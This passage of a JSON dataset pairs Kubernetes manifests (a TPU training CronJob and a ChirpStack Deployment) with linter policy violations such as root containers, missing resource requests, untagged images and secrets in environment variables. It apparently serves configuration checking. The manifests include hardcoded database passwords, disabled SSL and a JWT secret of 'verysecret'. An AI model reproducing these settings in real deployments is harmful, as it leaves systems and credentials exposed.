}\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "10281",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "10282",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "10283",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "10284",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "10285",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "10286",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET in container \"chirpstack-application-server\" found"
  },
  {
    "id": "10287",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"chirpstack-application-server\" is using an invalid container image, \"prrsjunior/chirpstack-application-server\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
